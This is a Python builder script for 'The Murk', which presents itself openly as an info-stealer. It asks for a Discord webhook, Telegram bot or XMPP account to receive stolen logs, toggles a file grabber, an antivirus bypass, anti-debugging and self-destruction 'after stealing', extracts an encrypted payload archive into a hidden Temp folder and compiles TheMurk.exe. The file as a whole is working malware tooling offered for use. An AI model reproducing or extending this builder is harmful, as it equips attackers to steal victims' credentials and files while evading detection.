#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#




import shutil
import os 
import win32con
import win32api
import pyzipper 
import time




class Builder():
    def __init__(self) -> None:
        self.type = self.Menu()
        if self.type == "Discord" :
            self.Discord()
        if self.type == "Telegram" :
            self.Telegram()
        if self.type == "XMPP" :
            self.XMPP()
        self.Options()

    def Menu(self):
        cmd = 'mode 80,30'
        os.system(cmd)
        self.logo = '''#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#'''
        print("\033[34m{}\033[0m".format(self.logo))
        print("\033[33m{}\033[0m".format("(i) Welcome to the Murk builder\n\n"))
        self.type = ""
        while self.type != "Discord" and self.type != "Telegram" and self.type != "XMPP":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Discord/Telegram/XMPP)"))
            self.type = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\n\n")
        return self.type

    def Discord(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) WebHook URL"))
        self.urlWebHook = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Bot name"))
        self.name = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
    
    def Telegram(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) HTTP API"))
        self.HTTP = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Telegram ID"))
        self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))

    def XMPP(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberid"))
        self.jabberid = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberpassword"))
        self.jabberpassword = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberreceiver"))
        self.jabberreceiver = input("\033[33m\033[1m{}\033[0m".format(">>> " ))

    def Options(self):
        self.fileGrab = ""
        while self.fileGrab != "Y" and self.fileGrab != "N" and self.fileGrab != "n" and self.fileGrab != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.fileGrab = input("\033[33m\033[1m{}\033[0m".format(">>> " ))

        self.oneStart = ""
        while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
            self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))

        self.avBypass = ""
        while self.avBypass != "Y" and self.avBypass != "N" and self.avBypass != "n" and self.avBypass != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses bypasser [y/n]"))
            self.avBypass = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        
        self.destruct = ""
        while self.destruct != "Y" and self.destruct != "N" and self.destruct != "n" and self.destruct != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable self destruction [y/n]"))
            self.destruct = input("\033[33m\033[1m{}\033[0m".format(">>> "))

        self.debuging = ""
        while self.debuging != "Y" and self.debuging != "N" and self.debuging != "n" and self.debuging != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable debuging mode(write \"n\" if you don't know what it is) [y/n]"))
            self.debuging = input("\033[33m\033[1m{}\033[0m".format(">>> "))

        self.builder = ""
        while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))

        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.Build()
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.Build()
            self.libs = "n"

    def Build(self):
        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pwd'))
        temp = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Temp'
        try:
            shutil.rmtree(temp + os.sep + 'buildingCache/', ignore_errors=True)
        except:
            pass
        shutil.move('buildingCache/',temp)
        win32api.SetFileAttributes(temp + os.sep + 'buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
        
        with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'r') as f:
            data = f.read()

        if self.fileGrab == "Y" or self.fileGrab == "y":
            data = data.replace('enableFileGrabber = False #enable file grabber', 'enableFileGrubber = True')

        if self.avBypass == "Y" or self.avBypass == "y":
            data = data.replace('avbypass = False #enable antiviruses bypass', 'avbypass = True')
        
        if self.destruct == "Y" or self.destruct == "y":
            data = data.replace('selfDestruct = False #deletes itself after stealing','selfDestruct = True')

        if self.oneStart == "Y" or self.oneStart == "y":
            data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
        
        if self.debuging == "Y" or self.debuging == "y":
            data = data.replace('debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)', 'debuging = True')
        
        if self.type == "Discord" :
            data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 0")
            data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{self.urlWebHook}","{self.name}"]')
        if self.type == "Telegram" :
            data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
            data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{self.HTTP}","{self.ID}"]')
        if self.type == "XMPP" :
            data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
            data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{self.jabberid}","{self.jabberpassword}","{self.jabberreceiver}"]')

        with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'w') as file:
            file.write(data)

        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')

        os.chdir(temp + os.sep + '/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        if self.builder == "Nuitka":
            os.system('start CompileNuitka.bat')
        if self.builder == "Pyinstaller":
            os.system('start CompilePyinstaller.bat')
        if self.builder == "Pyarmor":
            os.system('start CompilePyarmor.bat')
        while os.path.exists("TheMurk.exe") == 0:
            pass
        if os.path.exists("TheMurk.exe") == 1:
            time.sleep(180)
            os.chdir(f'{fullPath}')
            shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))   
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))

if __name__ == "__main__":
    Builder()
